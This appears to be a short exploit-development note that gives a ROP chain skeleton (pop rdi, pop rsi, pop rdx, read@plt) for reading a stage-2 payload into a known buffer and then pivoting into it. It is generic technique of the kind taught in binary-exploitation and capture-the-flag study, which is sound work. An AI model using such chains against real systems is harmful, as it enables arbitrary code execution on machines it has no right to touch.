# The staged alloc — read into memory


Using read(0, buf, n) to pull a stage-2 payload into a known buffer:

    pop rdi ; 0
    pop rsi ; buf_addr
    pop rdx ; n
    read@plt

The stage-2 chain lands; a pivot or a ret into buf executes it.
